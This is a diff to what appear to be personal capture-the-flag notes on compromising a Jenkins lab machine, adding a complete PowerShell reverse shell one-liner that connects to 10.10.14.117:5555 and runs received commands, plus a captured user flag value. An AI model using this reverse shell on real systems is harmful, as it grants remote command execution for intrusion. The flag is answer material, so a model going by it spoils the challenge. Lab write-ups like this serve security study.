@@ -71,9 +71,26 @@ Adn after build the jobs we can click on Conole OutPut and see the result of our
 
 ![[Pasted image 20250422165715.png]]
 
+So with this reverse shell we can have an #RCE 
+
+```POWERSHELL
+powershell -nop -c "& { $client = New-Object Net.Sockets.TCPClient('10.10.14.117',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
+```
+
+The server is extremely slow but it's okkey
+
+![[Pasted image 20250422172207.png]]
+
+
 ## 5. **Installation
 
 ## 6. **Command and Control
 
 ## 7. **Actions on Objectives
 
+So for the first flag it's in kohsuke on his desktop :
+
+```POWERSHELL
+> type kohsuke\Desktop\user.txt
+e3232272596fb47950d59c4cf1e7066a
+```
